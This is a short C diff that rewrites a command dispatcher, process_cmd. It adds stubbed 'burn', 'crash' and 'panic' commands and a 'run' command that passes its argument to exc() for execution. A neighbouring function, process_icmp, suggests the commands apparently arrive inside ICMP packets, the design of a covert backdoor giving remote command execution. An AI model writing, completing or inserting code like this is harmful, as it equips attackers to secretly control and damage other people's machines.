@@ -117,30 +117,37 @@ int process_cmd(char *cmd) {
 
     split_string(cmd, &arg1, &arg2);
 
-    if (arg1 != NULL) {
-        printf("%s\n", arg1);
+    if (arg1 == NULL) {
+        printf("Invalid command\n");
+        return 1;
+    } 
+
+    // single command
+    if (arg1 != NULL && arg2 == NULL) {
+        if (strcmp(arg1, "burn") == 0) {
+            printf("Burning...\n");
+            //burn();
+        } else if (strcmp(arg1, "crash") == 0) {
+            printf("Crashing...\n");
+            //crash();
+        } else if (strcmp(arg1, "panic") == 0) {
+            printf("Panicking...\n");
+            //crash();
+        } else {
+            printf("Invalid command\n");
+            return 1;
+        }
     } else {
-        printf("error\n");
+        if (strcmp(arg1, "run") == 0)
+            exc(arg2);
+        else {
+            printf("Invalid command\n");
+            return 1;
+        }
     }
 
-    if (arg2 != NULL) {
-        printf("%s\n", arg2);
-    } else {
-        printf("error\n");
-    }
+    return 0;
 
-    /*
-    if (strcmp(cmd, "burn") == 0) {
-        printf("Burning...\n");
-        //burn();
-    } else if (strcmp(cmd, "crash") == 0) {
-        printf("Crashing...\n");
-        //crash();
-    } else if (strcmp(cmd, "panic") == 0) {
-        printf("Panicking...\n");
-        //crash();
-    }
-    */
 }
 
 int process_icmp(unsigned char* buffer , int size, char *ip_src, char *ip_dst, char *msg) {
